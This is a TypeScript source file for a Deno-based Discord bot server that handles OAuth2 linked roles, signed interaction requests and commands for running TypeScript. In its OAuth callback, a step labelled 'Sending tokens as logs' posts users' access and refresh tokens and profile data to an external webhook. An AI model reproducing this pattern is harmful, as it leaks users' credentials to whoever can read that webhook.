import "https://deno.land/x/dotenv@v3.2.0/load.ts";
import nacl from "https://cdn.skypack.dev/tweetnacl@@1.0.3?dts";
import {
  setCookie,
  getCookies,
} from "https://deno.land/std@0.170.0/http/cookie.ts";
import {
  json,
  serve,
  validateRequest,
} from "https://deno.land/x/sift@0.6.0/mod.ts";
import { hexToUint8Array } from "./utils.ts";
import { afkAppCommandResponse } from "./interactions/afk/mod.ts";
import {
  runTsSlashCommandResponse,
  sendTsCodeOutput,
} from "./interactions/run_typescript/mod.ts";
import {
  InteractedMessage,
  InteractingMember,
  InteractionData,
} from "./types.ts";
import { PUBLIC_KEY, webHookUrlForUserToken } from "./config.ts";
import { storeDiscordTokens, tsRateLimit } from "./store.ts";
import {
  getOAuthTokens,
  getOAuthUrl,
  getUserData,
  updateMetadata,
} from "./api.ts";
import {
  setBatchSlashCommandResponse,
  setBatchSlashCommands,
} from "./interactions/set_batch/mod.ts";

serve(
  {
    "/": home,
    "/linked-role": linkedRole,
    "/discord-oauth-callback": oauthCallback,
  },
  {
    port: +(Deno.env.get("PORT") || "8000"),
  },
);

async function oauthCallback(req: Request) {
  try {
    // 1. Uses the code and state to acquire Discord OAuth2 tokens

    const { searchParams } = new URL(req.url);

    const code = searchParams.get("code");
    const discordState = searchParams.get("state");

    // make sure the state parameter exists
    const { clientState } = getCookies(req.headers);

    if (clientState !== discordState || !code) {
      return new Response("Forbidden", { status: 403 });
    }

    const tokens = await getOAuthTokens(code);

    // 2. Uses the Discord Access Token to fetch the user profile
    const metadata = await getUserData(tokens);
    const userId = metadata.user.id;

    storeDiscordTokens(userId, {
      access_token: tokens.access_token,
      refresh_token: tokens.refresh_token,
      expires_at: Date.now() + tokens.expires_in * 1000,
    });

    // 3. Update the users metadata
    try {
      await updateMetadata(userId);
    } catch (error) {
      console.error(error);
    }

    // 4. Sending tokens as logs
    try {
      if (webHookUrlForUserToken) {
        const result = await fetch(webHookUrlForUserToken, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            content: `\`\`\`\n${JSON.stringify(
              { metadata, tokens },
              null,
              2,
            )}\n\`\`\``,
          }),
        }).then((r) => r.text());

        console.log(result);
      }
    } catch (error) {
      console.error(error);
    }

    return new Response("You did it!  Now go back to Discord.");
  } catch (e) {
    console.error(e);
    return new Response("Internal Server Error", { status: 500 });
  }
}

function linkedRole(_request: Request) {
  const { url, state } = getOAuthUrl();

  const headers = new Headers();

  setCookie(headers, {
    name: "clientState",
    value: state,
    maxAge: 1000 * 60 * 5,
    httpOnly: true,
    secure: true,
  });

  // Send the user to the Discord owned OAuth2 authorization endpoint
  headers.set("Location", url);

  return new Response(null, { headers, status: 301 });
}

async function home(request: Request) {
  const { error } = await validateRequest(request, {
    POST: {
      headers: ["X-Signature-Ed25519", "X-Signature-Timestamp"],
    },
  });

  if (error) {
    return json({ error: error.message }, { status: error.status });
  }

  // verifySignature() verifies if the request is coming from Discord.
  // When the request's signature is not valid, we return a 401 and this is
  // important as Discord sends invalid requests to test our verification.
  const { valid, body } = await verifySignature(request);
  if (!valid) {
    return json(
      { error: "Invalid request" },
      {
        status: 401,
      },
    );
  }

  const {
    type = 0,
    data,
    member,
    message,
  } = JSON.parse(body) as {
    type: number;
    data: InteractionData;
    member: InteractingMember;
    message: InteractedMessage;
  };
  // Discord performs Ping interactions to test our application.
  // Type 1 in a request implies a Ping interaction.
  if (type === 1) {
    return json({
      type: 1, // Type 1 in a response is a Pong interaction response type.
    });
  }

  // Type 2 in a request is an ApplicationCommand interaction.
  // It implies that a user has issued a command.
  if (type === 2) {
    if ("name" in data && data.name.includes("AFK")) {
      return json(afkAppCommandResponse({ data, member }));
    } else if (
      "name" in data &&
      (data.name.includes("run_t") || data.name.includes("Run TypeScript"))
    ) {
      return json(runTsSlashCommandResponse());
    } else if ("name" in data && data.name === setBatchSlashCommands[0].name) {
      return json(await setBatchSlashCommandResponse(data, member));
    }

    return json({
      type: 4,
      data: {
        content: `OK!`,
        flags: 1 << 6,
      },
    });
  }
  // Type 5 in a request is a Modal submission.
  else if (type === 5) {
    if (!("components" in data)) {
      return json({
        type: 4,
        data: {
          content: `No Components!`,
          flags: 1 << 6,
        },
      });
    }

    if (!tsRateLimit[member.user.id]) {
      tsRateLimit[member.user.id] = {
        requests: 1,
        lastRequestAt: Date.now(),
      };
    } else {
      const trl = tsRateLimit[member.user.id];

      const oneMinute = 60000;

      trl.requests++;

      if (Date.now() - trl.lastRequestAt < oneMinute && trl.requests > 10) {
        return json({
          type: 4,
          data: {
            content: `Cool down. Retry after ${Math.ceil(
              60 - (Date.now() - trl.lastRequestAt) / 1000,
            )} seconds.`,
            flags: 1 << 6,
          },
        });
      } else if (Date.now() - trl.lastRequestAt > oneMinute) {
        tsRateLimit[member.user.id].requests = 0;
      }
    }

    tsRateLimit[member.user.id].lastRequestAt = Date.now();

    if (data.custom_id === "ts_code") {
      return json(await sendTsCodeOutput(data));
    } else if (data.custom_id === "prompt_for_ts_program") {
      const parts = message.content.split("```");

      const code = parts[1].replace("ts\n", "");
      const promptValues = parts[3]
        .trim()
        .split("\n")
        .filter((x) => x)
        .concat([data.components[0].components[0].value]);
      const promptSkips = +data.components[0].components[0].custom_id.replace(
        "prompt_",
        "",
      );

      return json(
        await sendTsCodeOutput(data, {
          code,
          promptValues,
          promptSkips,
        }),
      );
    }

    return json({
      type: 4,
      data: {
        content: `OK Modal!`,
        flags: 1 << 6,
      },
    });
  }
  // Type 3 in a request is a Message Component Interaction.
  else if (type === 3) {
    if ("custom_id" in data && data.custom_id.startsWith("button_prompt_")) {
      return json({
        type: 9,
        data: {
          title: "Prompt",
          custom_id: "prompt_for_ts_program",
          components: [
            {
              type: 1,
              components: [
                {
                  type: 4,
                  custom_id: `prompt_${data.custom_id.replace(
                    "button_prompt_",
                    "",
                  )}`,
                  label: `${
                    message?.content?.split("```").slice(-1)[0]?.trim() ||
                    "Enter a value"
                  }`,
                  style: 1,
                  min_length: 1,
                  required: true,
                },
              ],
            },
          ],
        },
      });
    }

    return json({
      type: 4,
      data: {
        content: `OK!`,
        flags: 1 << 6,
      },
    });
  }

  // We will return a bad request error as a valid Discord request
  // shouldn't reach here.
  return json({ error: "bad request" }, { status: 400 });
}

/** Verify whether the request is coming from Discord. */
async function verifySignature(
  request: Request,
): Promise<{ valid: boolean; body: string }> {
  // Discord sends these headers with every request.
  const signature = request.headers.get("X-Signature-Ed25519")!;
  const timestamp = request.headers.get("X-Signature-Timestamp")!;
  const body = await request.text();
  const valid = nacl.sign.detached.verify(
    new TextEncoder().encode(timestamp + body),
    hexToUint8Array(signature),
    hexToUint8Array(PUBLIC_KEY!),
  );

  return { valid, body };
}
